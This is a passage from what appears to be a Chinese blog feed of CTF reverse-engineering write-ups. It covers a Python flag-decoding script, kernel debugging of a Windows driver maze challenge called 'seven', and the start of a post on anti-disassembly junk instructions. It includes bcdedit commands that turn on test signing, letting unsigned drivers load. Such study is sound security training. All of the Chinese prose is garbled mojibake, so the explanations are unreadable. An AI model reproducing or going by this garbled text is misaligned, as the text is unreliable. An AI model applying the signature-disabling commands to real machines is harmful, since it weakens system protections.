class="number">0x7e09</span>,<span class="number">0x4f51</span>,<span class="number">0x4306</span>,<span class="number">0x22ac</span>,<span class="number">0x3f15</span>,<span class="number">0x34ba</span>,<span class="number">0x3c5a</span>,<span class="number">0x503f</span>,<span class="number">0x26f3</span>,<span class="number">0x73a2</span>,<span class="number">0x435f</span>,<span class="number">0x7a37</span>,<span class="number">0x4d34</span>,<span class="number">0x70a1</span>,<span class="number">0x685c</span>,<span class="number">0x7590</span>,<span class="number">0x6179</span>,<span class="number">0x5125</span>,<span class="number">0x5e19</span>,<span class="number">0xc2</span>,<span class="number">0x63e5</span>,<span class="number">0x2214</span>,<span class="number">0x15f2</span>,<span class="number">0x3f8c</span>,<span class="number">0x41d2</span>,<span class="number">0x51b2</span>,<span class="number">0x6229</span>,<span class="number">0x23f0</span>,<span class="number">0x2ac3</span>,<span class="number">0xc4</span>,<span class="number">0x1281</span>,<span class="number">0x687f</span>,<span class="number">0x319a</span>,<span class="number">0x6ef6</span>,<span class="number">0x3f08</span>,<span class="number">0x7fd6</span>,<span class="number">0xe0c</span>,<span class="number">0x67a</span>,<span class="number">0x3534</span>,<span class="number">0x1d69</span>,<span class="number">0x1251</span>,<span class="number">0x4af2</span>,<span class="number">0x3b31</span>,<span class="number">0x3b7f</span>,<span class="number">0x2920</span>,<span class="number">0x2f90</span>,<span class="number">0x1d7a</span>,<span class="number">0x427e</span>,<span class="number">0x6fda</span>,<span class="number">0x187b</span>,<span class="number">0x3aa7</span>,<span class="number">0x3569</span>,<span class="number">0x4106</span>,<span class="number">0xb75</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">enc = [<span class="number">0x49</span>,<span class="number">0xE6</span>,<span class="number">0x57</span>,<span class="number">0xBD</span>,<span class="number">0x3A</span>,<span class="number">0x47</span>,<span class="number">0x11</span>,<span class="number">0x4C</span>,<span class="number">0x95</span>,<span class="number">0xBC</span>,<span class="number">0xEE</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0xA0</span>,<span class="number">0xF0</span>,<span class="number">0xDE</span>,<span class="number">0xAC</span>,<span class="number">0xF2</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0x83</span>,<span class="number">0x49</span>,<span class="number">0x6E</span>,<span class="number">0xA9</span>,<span class="number">0xA6</span>,<span class="number">0xC5</span>,<span class="number">0x67</span>,<span class="number">0x3C</span>,<span class="number">0xCA</span>,<span class="number">0xC8</span>,<span class="number">0xCC</span>,<span class="number">0x05</span>]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">tar = []</span><br><span class="line">v16 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(token):</span><br><span class="line">    v16 = <span class="number">6</span></span><br><span class="line">    <span class="keyword">while</span> v16 &gt; -<span class="number">2</span>:</span><br><span class="line">        v17 = token[i] % <span class="number">4</span></span><br><span class="line">        v18 = v16</span><br><span class="line">        v16 -= <span class="number">2</span></span><br><span class="line">        res = ((v17 &amp; <span class="number">0xff</span>) &lt;&lt; (v18 &amp; <span class="number">0xff</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        tar.append(res)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(enc):</span><br><span class="line">    temp = enc[i]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">3</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">2</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">1</span>]</span><br><span class="line">    temp = temp ^ tar[k + <span class="number">0</span>]</span><br><span class="line">    k += <span class="number">4</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar5.png"
                      alt="image"
                ></p>
<p>åˆ©ç”¨ BASE64 è§£ç (æ³¨æ„æ›´æ¢è¡¨ç›˜)ï¼Œå³å¯æ‹¿åˆ°flagã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/luckystar6.png"
                      alt="image"
                ></p>
<p>flagï¼š <strong>hctf{1zumi_K0nat4_Mo3}</strong></p>
<h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>è¿™é“é¢˜ç›®æ¶‰åŠåˆ°ä¸€äº›åè°ƒè¯•æ‰‹æ®µå’ŒåŠ¨æ€ä»£ç è§£å¯†ã€ä»¥åŠ TLS ç­‰çŸ¥è¯†ï¼Œåšé¢˜æ—¶è¿˜æ˜¯è¦æœ‰è€å¿ƒï¼Œè¿™é“é¢˜æˆ‘è°ƒäº†å¾ˆä¹…æ‰åšå‡ºæ¥(æ¶å¿ƒåˆ°äº†ã€‚ã€‚ã€‚)ä¸­é—´æ”¾å¼ƒäº†ä¸€æ®µæ—¶é—´ï¼Œåšå‡ºæ¥ä¹‹åå‘ç°å…¶å®æ²¡æœ‰é‚£ä¹ˆéš¾ã€‚  </p>
<p>PSï¼š åæ§½ä¸€ä¸‹é…çš„éŸ³ä¹ï¼ŒçœŸçš„å¤ªé­”æ€§äº† ORZã€‚ã€‚ã€‚</p>
<h2 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h2><h3 id="åŒæœºè°ƒè¯•"><a href="#åŒæœºè°ƒè¯•" class="headerlink" title="åŒæœºè°ƒè¯•"></a>åŒæœºè°ƒè¯•</h3><p>è¿™æ˜¯ä¸€é“ Windows 64ä½çš„é©±åŠ¨é€†å‘é¢˜ç›®ï¼Œä¹‹å‰æ²¡æœ‰åšè¿‡å…³äºé©±åŠ¨çš„é€†å‘ï¼Œåšå®Œè¿™é“é¢˜æ„Ÿè§‰é©±åŠ¨å…¶å®å’Œä¸€èˆ¬çš„å¯æ‰§è¡Œç¨‹åºç±»ä¼¼ï¼Œæœ€ä¸»è¦çš„åŒºåˆ«å°±æ˜¯é©±åŠ¨å’Œç³»ç»Ÿå†…æ ¸æ˜¯æœ‰å…³ç³»çš„ï¼Œå®ƒéœ€è¦å…ˆè¢«åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œæ‰èƒ½å¤Ÿéšç€å†…æ ¸ä¸€èµ·è¿è¡Œã€‚<br>åœ¨é™æ€åˆ†ææ–¹é¢ï¼Œé©±åŠ¨æ¶‰åŠåˆ°ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°ï¼Œä¸»è¦çš„ç®—æ³•é€»è¾‘æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„å˜åŒ–ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯å‡½æ•°å‚æ•°ï¼Œå› ä¸ºåœ¨è¿è¡Œé©±åŠ¨çš„æ—¶å€™è°ƒç”¨çš„å‡½æ•°æ˜¯ iocalldriver ç­‰ï¼Œå‚æ•°åœ¨é™æ€åˆ†ææ—¶ä¸å¥½å‘ç°ï¼Œäºæ˜¯éœ€è¦ç»“åˆåŠ¨æ€è°ƒè¯•æ‰‹æ®µã€‚<br>ä¹‹å‰è¯´é©±åŠ¨å’Œä¸€èˆ¬çš„å¯æ‰§è¡Œç¨‹åºä¸ä¸€æ ·å°±ä½“ç°åœ¨è°ƒè¯•çš„æ–¹æ³•ä¸Šï¼Œç”±äºé©±åŠ¨æ˜¯å’Œå†…æ ¸ç»‘åœ¨ä¸€å—çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—è°ƒè¯•ç³»ç»Ÿå†…æ ¸ï¼ŒæŠŠæ“ä½œç³»ç»Ÿçœ‹æˆä¸€ä¸ªè½¯ä»¶ï¼Œé©±åŠ¨åªæ˜¯è¿™ä¸ªè½¯ä»¶ä¸­çš„ä¸€å°éƒ¨åˆ†ã€‚<br>è°ƒè¯• windows å†…æ ¸å¾®è½¯å®˜æ–¹ç»™å‡ºçš„æ¨èå°±æ˜¯ åŒæœºè°ƒè¯•ï¼Œå³æ‹¿æ¥ä¸¤å°ç”µè„‘ï¼Œä¸€å°ä½œä¸ºè°ƒè¯•è€…ï¼Œå¦ä¸€å°æœ€ä¸ºç›®æ ‡æœºå™¨ï¼Œåœ¨è°ƒè¯•æœºä¸Šé¢ä½¿ç”¨ windbg é€šè¿‡æŸäº›è¿æ¥æ–¹å¼å¯¹å¦ä¸€å°æœºå™¨çš„æ“ä½œç³»ç»Ÿè¿›è¡Œè°ƒè¯•ï¼Œä¸¤å°ç”µè„‘çš„å¼€é”€å¤ªé«˜äº†ï¼Œç°åœ¨æœ€å¸¸ç”¨çš„è°ƒè¯•å†…æ ¸çš„æ‰‹æ®µå°±æ˜¯ ä¸»æœº + è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºæ¨èä½¿ç”¨ VMwareã€‚<br>é¦–å…ˆæ­å»ºå†…æ ¸çš„è°ƒè¯•ç¯å¢ƒï¼Œ<a class="link"   href="https://blog.csdn.net/sagittarius_warrior/article/details/51305046" >å‚è€ƒåšå®¢<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚<br>åšå®¢ç»™å‡ºçš„æ­¥éª¤å·²ç»å¾ˆè¯¦ç»†äº†ï¼Œå¤§è‡´åˆ†ä¸ºï¼š</p>
<ol>
<li>é…ç½®è™šæ‹Ÿæœºçš„ç®¡é“ï¼Œé€šè¿‡æ–°å¢ä¸²å£ä¸ºè™šæ‹Ÿæœºæ·»åŠ ç®¡é“ã€‚</li>
<li>é…ç½®ä¸»æœºçš„ windbg å¯åŠ¨é€‰é¡¹ï¼Œå¯ä»¥é€šè¿‡å¿«æ·æ–¹å¼å‚æ•°æ¥å®ç°ã€‚</li>
<li>é…ç½®è™šæ‹Ÿæœºçš„å¼€æœºå¼•å¯¼é¡¹ï¼Œæ–°å¢è°ƒè¯•æ¨¡å¼ã€‚</li>
<li>ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨è™šæ‹Ÿæœºï¼Œå¹¶åœ¨<strong>å¯åŠ¨è¿‡ç¨‹ä¸­</strong>ä½¿ç”¨ windbg é™„åŠ ä¸Šå»ã€‚</li>
</ol>
<p>ç¯å¢ƒæ­å»ºå¹¶ä¸å›°éš¾ï¼Œé‡ç‚¹æ˜¯æ¥ä¸‹æ¥çš„è°ƒè¯•è¿‡ç¨‹ï¼Œç”±äºè°ƒè¯•çš„æ˜¯é©±åŠ¨ï¼Œé‚£ä¹ˆé¦–å…ˆè¦æŠŠå®ƒå®‰è£…å¥½ï¼Œå¯ä»¥ä½¿ç”¨ cmd å‘½ä»¤ç›´æ¥å®‰è£…ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…· OSRLoaderï¼Œè¿™ä¸ªå·¥å…·å›¾å½¢åŒ–æ“ä½œæ¯”è¾ƒæ–¹ä¾¿ã€‚<br>åœ¨åŠ è½½é©±åŠ¨ä¹‹å‰ï¼Œå…ˆè¦å–æ¶ˆç³»ç»Ÿå¯¹é©±åŠ¨æ•°å­—ç­¾åçš„éªŒè¯ï¼Œå¹¶è®¾ç½®ä¸€äº›å…¶ä»–çš„ä¸œè¥¿ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit /copy &#123;current&#125; /d &quot;Windwos7&quot; å»ºç«‹ä¸€ä¸ªæ–°çš„å¯åŠ¨é¡¹ã€‚</span><br><span class="line">bcdedit /debug ON</span><br><span class="line">bcdedit /bootdebug ON è®¾ç½®æ–°çš„å¯åŠ¨é¡¹ã€‚</span><br><span class="line">bcdedit /dbgsettings æŸ¥çœ‹å½“å‰çš„è°ƒè¯•é…ç½®ï¼š</span><br><span class="line">bcdedit /timeout 10 é€‰æ‹©èœå•çš„è¶…æ—¶ï¼Œæˆ‘è®¾ç½®ä¸º10ç§’</span><br><span class="line">bcdedit -set TESTSIGNING on è®¾ç½®å…è®¸åŠ è½½ä¸å—ä¿¡ä»»çš„é©±åŠ¨</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä½¿ç”¨å‘½ä»¤è¡Œï¼Œå¯ä»¥ç”¨ sc :</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc query type= driver å¯ä»¥æŸ¥çœ‹é©±åŠ¨åˆ—è¡¨</span><br><span class="line">sc create &lt;èµ·ä¸ªåå­—&gt; binPath= &lt;é©±åŠ¨è·¯å¾„&gt; type= &lt;é©±åŠ¨æ¨¡å¼ï¼Œä¸€èˆ¬æ˜¯ kernel&gt;  è¿™æ¡å‘½ä»¤åŠ è½½ä¸€ä¸ªé©±åŠ¨</span><br><span class="line">sc stop &lt;é©±åŠ¨åå­—&gt;  åœæ­¢ä¸€ä¸ªé©±åŠ¨</span><br><span class="line">sc delete &lt;é©±åŠ¨åå­—&gt;  åˆ é™¤ä¸€ä¸ªé©±åŠ¨</span><br></pre></td></tr></table></figure></div>
<h3 id="å¼€å§‹è°ƒè¯•"><a href="#å¼€å§‹è°ƒè¯•" class="headerlink" title="å¼€å§‹è°ƒè¯•"></a>å¼€å§‹è°ƒè¯•</h3><p>é¦–å…ˆå°† windbg é™„åŠ åˆ°è™šæ‹Ÿæœºä¸Šï¼Œå¦‚æœä¸å‡ºæ„å¤–çš„è¯ï¼Œæ§åˆ¶å°åº”è¯¥ä¼šæ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven1.png"
                      alt="image"
                ></p>
<p>ç°åœ¨å·²ç»åœ¨å†…æ ¸æ–­ä¸‹ï¼ŒæŒ‰ F5 é”®è¿è¡Œï¼Œç›´åˆ°è™šæ‹Ÿæœºå¯ä»¥æ­£å¸¸æ“ä½œã€‚<br>æ¥ç€åœ¨ windbg æ–­ä¸‹ç³»ç»Ÿ(ä¸Šæ–¹å·¥å…·æ ä¸­çš„æŒ‰é’®)ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sxe ld seven.sys</span><br></pre></td></tr></table></figure></div>
<p>æ„æ€å°±æ˜¯å½“ seven è¿™ä¸ªé©±åŠ¨åŠ è½½èµ·æ¥çš„æ—¶å€™å°±è‡ªåŠ¨æ–­ä¸‹ã€‚<br>è®¾ç½®å¥½åç»§ç»­è¿è¡Œï¼ŒæŒ‰ç…§ä¸Šé¢çš„å‘½ä»¤æŠŠé©±åŠ¨åŠ è½½èµ·æ¥ï¼Œå¦‚æœè®¾ç½®æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåœ¨æ‰§è¡Œ sc start ä¹‹åå°±ä¼šæ–­ä¸‹æ¥ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven2.png"
                      alt="image"
                ><br>å¦‚ä¸Šå›¾ï¼Œä½¿ç”¨ OSR è½¯ä»¶åŠ è½½é©±åŠ¨ï¼Œç‚¹å‡» start ä¹‹åå°±ä¼šæ–­ä¸‹æ¥ã€‚</p>
<p>ä½†æ˜¯æ–­ç‚¹æ‰€åœ¨çš„ä½ç½®ä¸æ˜¯é©±åŠ¨çš„å…¥å£ç‚¹ï¼Œè€Œæ˜¯ ntdll.dll ä¸­çš„æŸä¸€å¤„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å‘½ä»¤ lm æ¥æ‰¾åˆ° seven çš„å…¥å£ä½ç½®ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven3.png"
                      alt="image"
                ></p>
<p>è“è‰²æ–¹æ¡†å°±æ˜¯æ¨¡å—çš„èµ·å§‹åœ°å€ï¼Œç»“åˆ IDA ä¸­çš„åç§»é‡ï¼Œå¯ä»¥åœ¨ç›¸åº”çš„å‡½æ•°ä¸‹æ–­ç‚¹ã€‚<br>é€šè¿‡ IDA åˆ†æé©±åŠ¨ï¼Œå‘ç°ä¸»è¦é€»è¾‘å‡½æ•°åœ¨äº sub_140012f0 ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400012F0</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  __int16 *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbp</span></span><br><span class="line">  __int16 v8; <span class="comment">// dx</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// dl</span></span><br><span class="line">  CHAR *v10; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(a2 + <span class="number">0x30</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(a2 + <span class="number">0x18</span>);</span><br><span class="line">    v4 = (*(a2 + <span class="number">56</span>) * <span class="number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = dword_1400030E4;</span><br><span class="line">      v6 = (v3 + <span class="number">2</span>);</span><br><span class="line">      v7 = v4;</span><br><span class="line">      <span class="keyword">while</span> ( *(v3 + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_30:</span><br><span class="line">        v6 += <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !--v7 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">      &#125;</span><br><span class="line">      aO[v5] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      v8 = *v6;</span><br><span class="line">      <span class="keyword">if</span> ( *v6 == <span class="number">17</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 -= <span class="number">16</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 += <span class="number">208</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">31</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xFFFFFFF0</span>) == <span class="number">0xD0</span> )</span><br><span class="line">        v5 -= <span class="number">208</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5 += <span class="number">16</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      dword_1400030E4 = v5;</span><br><span class="line">LABEL_14:</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &amp; <span class="number">0xF</span> )</span><br><span class="line">          --v5;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v5 += <span class="number">15</span>;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xF</span>) == <span class="number">15</span> )</span><br><span class="line">          v5 -= <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ++v5;</span><br><span class="line">        dword_1400030E4 = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = aO[v5];</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="string">&quot;-1s\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="string">&#x27;7&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">          aO[v5] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="string">&quot;The input is the flag!\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      dword_1400030E4 = <span class="number">16</span>;</span><br><span class="line">      DbgPrint(v10);</span><br><span class="line">      v5 = dword_1400030E4;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  <span class="keyword">if</span> ( *(v2 + <span class="number">65</span>) )</span><br><span class="line">    *(*(v2 + <span class="number">184</span>) + <span class="number">3</span>i64) |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> *(v2 + <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å®é™…ä¸Šå¦‚æœå¯¹é©±åŠ¨æ¯”è¾ƒç†Ÿæ‚‰çš„è¯ï¼Œé€»è¾‘å¹¶ä¸éš¾ï¼Œç”±äºé©±åŠ¨åŠ è½½äº† kdbclass.sysï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v8 = L&quot;\\Driver\\kbdclass&quot;;</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ä»£ç ä¸­çš„ä¸€äº›åˆ¤æ–­éƒ½æ˜¯åŸºäºé”®ç›˜é©±åŠ¨å·çš„ï¼Œæ¯”å¦‚ 0x11 å¯¹åº”å­—ç¬¦ â€˜wâ€™ ç­‰ç­‰ï¼Œé€šè¿‡åˆ†æå¾—å‡ºç»“è®ºï¼Œç¨‹åºå¯¹<br>w a s d è¿™å››ä¸ªæŒ‰é”®è¿›è¡Œåˆ¤æ–­ï¼Œå…¶ä»–è¾“å…¥ä¸ä¼šäº§ç”Ÿå½±å“ã€‚  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">é™„ï¼šé”®ç›˜çš„ç¡¬ä»¶æ‰«æç </span><br><span class="line">https://blog.csdn.net/firas/article/details/26267573</span><br></pre></td></tr></table></figure></div>

<p>ç¡®å®šäº†æ–­ç‚¹ä½ç½®ï¼Œä½¿ç”¨å‘½ä»¤ bp fffff880&#96;032a7000+12f0 å°±å¯ä»¥åœ¨å…³é”®å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç´§æ¥ç€ f5 ç»§ç»­è¿è¡Œï¼Œå½“åœ¨è™šæ‹Ÿæœºä¸­è¾“å…¥ä¸€ä¸ªå­—ç¬¦(åœ¨é”®ç›˜ä¸ŠæŒ‰ä¸‹ä»»æ„ä¸€ä¸ªé”®)ï¼Œwindbgå°±ä¼šå†æ¬¡æ–­ä¸‹ï¼Œè¿™å›ä½ç½®å°±åœ¨å…³é”®å‡½æ•°çš„å…¥å£ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven4.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven5.png"
                      alt="image"
                ></p>
<p>æ¥ç€å°±å¯ä»¥ç€æ‰‹è°ƒè¯•äº†ï¼ŒF10 å’Œ F11 å¯¹åº”ç€ OD çš„ F7 å’Œ F8ï¼Œé€šè¿‡è°ƒè¯•å¯ä»¥ç†è§£è¿™ä¸ªå‡½æ•°çš„ç›®çš„ï¼Œå®ƒå¤šæ¬¡å¯¹å†…ç½®çš„ä¸€ä¸ªå­—ç¬¦æ•°ç»„è¿›è¡Œæ“ä½œï¼Œåœ¨ IDA ä¸­è¿™ä¸ªæ•°ç»„æ˜¯ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven6.png"
                      alt="image"
                ></p>
<p>çœ‹ä¸Šå»æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†æ˜¯æ ¹æ®ç»éªŒæ¨æ–­ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ä¸€ç§è¿·å®«ï¼Œæœ€åå¯¹æ˜¯å¦åˆ°è¾¾å­—ç¬¦ â€˜7â€™ è¿›è¡ŒéªŒè¯ï¼ŒçŒœæµ‹æ˜¯è¦æŠŠ o ç§»åŠ¨åˆ° 7 çš„ä½ç½®ï¼Œåœ¨ windbg ä¸­éšä¾¿è°ƒæ•´äº†ä¸€ä¸‹å®½åº¦ï¼Œå¾—å‡ºäº†è¿·å®«ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/seven7.png"
                      alt="image"
                ></p>
<p>ä¸€ä¸ª 7 å‹è¿·å®«ï¼Œä½¿ç”¨ wasd æ“æ§ o èµ°åˆ° 7 å°±èƒœåˆ©äº†ï¼<br>èµ°ä¸€æ³¢è®°å½•ä¸‹æ¥æ¯ä¸€æ­¥çš„æ“ä½œï¼Œåˆ°æœ€åä¸€æ­¥çš„æ—¶å€™å•æ­¥è°ƒè¯•ï¼ŒæŸ¥çœ‹ Dbgprint å‡½æ•°çš„å‚æ•°å°±æ˜¯ The input is the flag!ï¼Œè¡¨ç¤ºè¾“å…¥æ­£ç¡®ã€‚  </p>
<p>flag: <strong>hctf{ddddddddddddddssaasasasasasasasasas}</strong></p>
<h3 id="å°æ€»ç»“-1"><a href="#å°æ€»ç»“-1" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>è°ƒè¯•é©±åŠ¨è¿™æ˜¯ç¬¬ä¸€æ¬¡ï¼ŒæŠŠç¯å¢ƒæ­å¥½ä¹‹åå°±å¯ä»¥åƒè°ƒè¯•æ­£å¸¸å¯æ‰§è¡Œç¨‹åºä¸€æ ·è°ƒè¯•å†…æ ¸å’Œé©±åŠ¨äº†ã€‚<br>è¿™é“é¢˜ç›®çš„æ•°ç»„åº”è¯¥æ˜¯ä¸€ç»´çš„ï¼Œå¯¼è‡´é™æ€åˆ†æéš¾ä¸€äº›ï¼ŒåŠ¨æ€è°ƒè¯•å°±å¾ˆç®€å•ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>De-DeCompiler</title>
    <url>/2018/11/02/dedecompiler/</url>
    <content><![CDATA[<p>ç®€å•çš„èŠ±æŒ‡ä»¤ã€‚</p>
<span id="more"></span>

<h2 id="GCC-ç®€å•çš„å†…è”æ±‡ç¼–"><a href="#GCC-ç®€å•çš„å†…è”æ±‡ç¼–" class="headerlink" title="GCC ç®€å•çš„å†…è”æ±‡ç¼–"></a>GCC ç®€å•çš„å†…è”æ±‡ç¼–</h2><p>GCC æ”¯æŒåœ¨ä»£ç ä¸­åµŒå…¥æ±‡ç¼–ä»£ç ï¼Œè¿™äº›ä»£ç è¢«ç§°ä¸ºâ€œGCCå†…è”æ±‡ç¼–â€ã€‚  </p>
<p>å†…è”æ±‡ç¼–ä¸åªæœ‰ GCC æ”¯æŒï¼ŒåŒ…æ‹¬å¾®è½¯çš„ VS å’Œå…¶ä»–ä¸€äº›ç¼–è¯‘å™¨ä¹Ÿæ”¯æŒå†…è”æ±‡ç¼–ï¼ŒGCCçš„å†…è”æ±‡ç¼–è¯­æ³•æ¯”è¾ƒç®€å•ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__ [__volatile__] (&quot;æŒ‡ä»¤åºåˆ—&quot;)</span><br></pre></td></tr></table></figure></div>
<ol>
<li>__asm__ æ˜¯ GCC å†…è”æ±‡ç¼–(asm å®)çš„å…³é”®å­—ï¼Œä½¿ç”¨å®ƒæ¥å£°æ˜ä¸€ä¸ªå†…è”æ±‡ç¼–ã€‚ </li>
<li>__volatile__ æ˜¯ volatile çš„å®å®šä¹‰ï¼Œå®ƒæ˜¯å¯é€‰çš„ï¼Œç”¨æ¥å‘Šè¯‰ç¼–è¯‘å™¨ä¸è¦ä¼˜åŒ–æˆ–æ›´æ”¹ä¸‹é¢ä¸€æ®µä»£ç ã€‚</li>
